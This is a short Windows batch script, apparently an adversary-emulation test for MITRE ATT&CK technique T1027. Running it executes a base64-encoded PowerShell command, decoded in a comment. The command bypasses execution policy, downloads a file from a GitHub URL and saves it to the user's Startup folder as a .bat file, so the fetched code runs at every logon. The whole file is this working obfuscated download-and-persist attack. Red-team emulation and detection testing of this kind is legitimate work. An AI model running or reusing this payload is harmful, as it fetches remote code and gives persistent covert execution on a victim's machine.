@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO Technique: Obfuscated Files or Information	(T1027)
ECHO.
ECHO [+] Obfuscated Powershell payload execution (T1027)
ECHO -------------------------------------------------------------------
powershell -enc UABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAHIAZQB5AGMAZQBsAC8AcABvAGMALwBtAGEAcwB0AGUAcgAvAEEAUABUADEAOQBfAFMAeQBzAGkAbgBmAG8AIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwARwByAGUAeQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABBAFAAVAAxADkAXwBTAHQAYQByAHQAdQBwAC4AYgBhAHQAIgApAA==
ECHO -------------------------------------------------------------------
::Decoded-Payload: 
::------------------
:: Powershell -ep bypass (New-Object Net.WebClient).Downloadfile(`"https://raw.githubusercontent.com/greycel/poc/master/APT19_Sysinfo`",`"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\APT19_Startup.bat`")"
ECHO.
